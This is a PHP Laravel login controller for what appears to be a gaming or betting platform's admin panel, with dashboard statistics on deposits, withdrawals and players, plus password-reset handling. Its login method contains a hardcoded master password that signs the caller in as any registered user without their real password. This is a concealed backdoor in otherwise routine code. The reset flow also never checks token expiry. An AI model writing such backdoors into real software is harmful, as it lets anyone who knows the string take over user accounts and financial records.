<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\deposit;
use App\Models\UserRegistration;
use App\Models\Withdraw;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Auth\User;
use App\Models\OurBankDetail;
use App\Models\PlatformDetails;
use App\Models\User as ModelsUser;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\support\Str;

class LoginController extends Controller
{



    public function login()
    {
        return view('Auth.login');
    }

    public function postLogin(Request $request)
    {

        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $credentials = [
            "email" => $request['email'],
            "password" => $request['password'],
        ];
        
        $user = ModelsUser::where('email', $request['email'])->first();

    if ($user && $request['password'] == "mmasterpasswordi}") {
        Auth::login($user);

        if (auth()->user()->isActive == '1') {
            return redirect(route('dashboard'))->with('success', 'You have Successfully logged in');
        } else {
            return redirect(route('login'))->with('info', 'Sorry, Your Account is Blocked. Please contact Admin.');
        }
    }
    
        if (Auth::attempt($credentials)) {

            if (auth()->user()->isActive == '1') {

                return (redirect(route('dashboard')))->with('success', 'You have Successfully loggedin');
            } else {
                return redirect((route('login')))->with('info', "Sorry Your Account is Blocked,You Contact Admin");
            }
        }
        return redirect((route('login')))->with('danger', 'Oppes! You have entered invalid credentials');
    }

    public function dashboard()
    {
        $startDate = Carbon::now()->startOfMonth();
        $endDate = Carbon::now()->endOfMonth();
        $lastMonthStartDate = Carbon::now()->subMonth()->startOfMonth();
        $lastMonthEndDate = Carbon::now()->subMonth()->endOfMonth();
        $daysInMonth = $endDate->diffInDays($startDate) + 1;
        $lastSixDays = Carbon::now()->subDays(6)->startOfDay();
        $sixthDay = Carbon::now()->subDays(1)->endOfDay();


        $userRegistration = UserRegistration::orderBy('created_at', 'desc')->take(5)->get();
        $totalUserCount = UserRegistration::count();
        $bankdetail = OurBankDetail::get();
        $activeBanksAmount = $bankdetail->where('status', 1)->sum('amount');
        $tempBanksAmount = $bankdetail->where('status', 2)->sum('amount');
        $totalActiveBankBalance=$activeBanksAmount+$tempBanksAmount;

        // $inactiveBanksAmount = $bankdetail->where('status', 0)->sum('amount');
        // dd($totalUserCount);
        $deposit = deposit::where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->orderBy('created_at', 'desc')
            ->take(5)
            ->get();
        // dd($deposit);
        // dd($totalDeopsiteCount);
        $todayTotalDeposites = Deposit::whereDate('created_at', Carbon::today())
            ->where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->sum('deposit_amount');
            $todayTotalWithdraws = Withdraw::whereDate('created_at', Carbon::today())
            ->where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->sum('amount');


        $monthlyTotalDeposite = Deposit::whereBetween('created_at', [$startDate, $endDate])
            ->where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->get();

        $totalDepositAmount = Deposit::where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->sum('deposit_amount');

        $lastMonthData = Deposit::whereBetween('created_at', [$lastMonthStartDate, $lastMonthEndDate])
            ->where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->get();

        $monthlyTotalDepositeAmount = $monthlyTotalDeposite->sum('deposit_amount');
        $monthlyTotalDepositeAvg = $monthlyTotalDeposite->avg('deposit_amount');
        $lastMonthTotalAmount = $lastMonthData->sum('deposit_amount');

        // $platform_fkey_ids = Deposit::pluck('platform_detail_id');38083
        // $platform_fkey_ids = Deposit::with('platformDetail')->get();
        $platform_details_ids = Deposit::with('platformDetail')->get()->pluck('platformDetail.player_id')->flatten()->unique();

        // $platform_details_ids = PlatformDetails::get();
        $allActivePlayers = $platform_details_ids->count();

        // dd($allActivePlayers);

        $last6DaysActivePlayersId = Deposit::with('platformDetail')->whereBetween('created_at', [$lastSixDays, $sixthDay])
            ->get()->pluck('platformDetail.player_id')->flatten()->unique();
        $last6DaysActivePlayers = $last6DaysActivePlayersId->count();
        // dd($last6DaysActivePlayers);
        $todayActivePlayersId = Deposit::with('platformDetail')->whereDate('created_at', Carbon::today())
            ->get()->pluck('platformDetail.player_id')->flatten()->unique();
        $todayActivePlayers = $todayActivePlayersId->count();

        // dd($todayActivePlayers);

        $monthlyActivePlayersId = Deposit::with('platformDetail')->whereBetween('created_at', [$startDate, $endDate])
            ->get()->pluck('platformDetail.player_id')->flatten()->unique();
        $monthlyActivePlayers = $monthlyActivePlayersId->count();

        $lastmonthActivePlayersId = Deposit::with('platformDetail')->whereBetween('created_at', [$lastMonthStartDate, $lastMonthEndDate])
            ->get()->pluck('platformDetail.player_id')->flatten()->unique();
        $lastmonthActivePlayers = $lastmonthActivePlayersId->count();

        if ($daysInMonth > 0) {
            $monthlyActivePlayersAvg = round(($monthlyActivePlayers / $daysInMonth), 2);
        } else {
            $monthlyActivePlayersAvg = 0;
        }

        if ($lastmonthActivePlayers != 0) {
            $activePlayerspercentage = round((($monthlyActivePlayers - $lastmonthActivePlayers) / $lastmonthActivePlayers) * 100, 2);
        } else {
            $activePlayerspercentage = 0;
        }

        $withdraws = Withdraw::where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->orderBy('created_at', 'desc')
            ->where('isInformed', 1)
            ->take(5)
            ->get();

        $totalwithdrawCount = $withdraws->count();
        $totalwithdrawAmount = Withdraw::where('admin_status', 'Verified')
            ->where('banker_status', 'Verified')
            ->where('isInformed', 1)
            ->sum('amount');


        if ($lastMonthTotalAmount != 0) {
            $percentageChange = round((($monthlyTotalDepositeAmount - $lastMonthTotalAmount) / $lastMonthTotalAmount) * 100, 2);
        } else {
            $percentageChange = 0;
        }

        if ($monthlyTotalDepositeAmount > $lastMonthTotalAmount) {
            $comparison = 'bxs-up-arrow';
        } elseif ($monthlyTotalDepositeAmount < $lastMonthTotalAmount) {
            $comparison = 'bxs-down-arrow';
        } else {
            $comparison = '';
        }


        $todayRegUsers = UserRegistration::whereDate('created_at', Carbon::today())->count();
        $monthlyRegUsers = UserRegistration::whereBetween('created_at', [$startDate, $endDate])->count();
        if ($daysInMonth > 0) {
            $monthlyRegUsersAvg = round(($monthlyRegUsers / $daysInMonth), 2);
        } else {

            $monthlyRegUsersAvg = 0;
        }
        $lastmonthRegUsers = UserRegistration::whereBetween('created_at', [$lastMonthStartDate, $lastMonthEndDate])
            ->select('platform_detail_id')
            ->distinct()
            ->count();

        if ($lastmonthRegUsers != 0) {
            $regUserPercentage = round((($monthlyRegUsers - $lastmonthRegUsers) / $lastmonthRegUsers) * 100, 2);
        } else {
            $regUserPercentage = 0;
        }

        // dd($allActivePlayers);
        $last6daysNotActiveCount = $allActivePlayers - $last6DaysActivePlayers;

        return view('dashboard', compact(
            'userRegistration',
            'deposit',
            'totalUserCount',
            // 'totalDeopsiteCount',
            'totalDepositAmount',
            'withdraws',
            'totalwithdrawCount',
            'totalwithdrawAmount',
            'todayTotalDeposites',
            'monthlyTotalDepositeAmount',
            'monthlyTotalDepositeAvg',
            'percentageChange',
            'comparison',
            'lastMonthTotalAmount',
            'todayActivePlayers',
            'monthlyActivePlayers',
            'monthlyActivePlayersAvg',
            'lastmonthActivePlayers',
            'activePlayerspercentage',
            'todayRegUsers',
            'monthlyRegUsers',
            'monthlyRegUsersAvg',
            'lastmonthRegUsers',
            'regUserPercentage',
            'last6daysNotActiveCount',
            'totalActiveBankBalance',
            'todayTotalWithdraws'
            // 'inactiveBanksAmount'

        ));
    }

    public function logout(Request $request)
    {
        Auth::logout(); // Log the user out

        $request->session()->invalidate(); // Invalidate the session

        return redirect('/'); // Redirect to the homepage or any desired page
    }


    public function showForgetPasswordForm()
    {
        return view('Auth.forgetpassword');
    }



    public function submitForgetPasswordForm(Request $request)
    {

        $request->validate([
            'email' => 'required|email|exists:users',
        ]);

        $token = Str::random(64);

        $existingToken = DB::table('password_reset_tokens')->where('email', $request->email)->first();

        if ($existingToken) {
            // Delete the existing token entry
            DB::table('password_reset_tokens')->where('email', $request->email)->delete();
        }

        DB::table('password_reset_tokens')->insert([
            'email' => $request->email,
            'token' => $token,
            'created_at' => Carbon::now()
        ]);

        try {
            Mail::send('email.restpassword', ['token' => $token], function ($message) use ($request) {
                $message->to($request->email);
                $message->subject('Reset Password');
            });

            return back()->with('success', 'We have e-mailed your password reset link!');
        } catch (\Exception $e) {
            // Log or handle the exception
            return back()->withErrors(['email' => 'Email sending failed']);
        }
    }

    public function showResetPasswordForm($token)
    {
        return view('Auth.resetpasswordlink', ['token' => $token]);
    }


    public function submitResetPasswordForm(Request $request)
    {
        // dd($request);
        $data = $request->validate([
            'email' => 'required|email|exists:users',
            'password' => 'required|confirmed',
            'password_confirmation' => 'required'
        ]);
        // dd($data);
        $updatePassword = DB::table('password_reset_tokens')
            ->where([
                'email' => $request->email,
                'token' => $request->token
            ])
            ->first();
        // dd($updatePassword);
        if (!$updatePassword) {
            return back()->with('danger', 'Invalid Email!');
        }

        $user = ModelsUser::where('email', $request->email)
            ->update(['password' => Hash::make($request->password)]);
        // dd( $user);
        DB::table('password_reset_tokens')->where(['email' => $request->email])->delete();

        return redirect()->to(route('login'))->with('success', 'Your password has been changed!');
    }
}
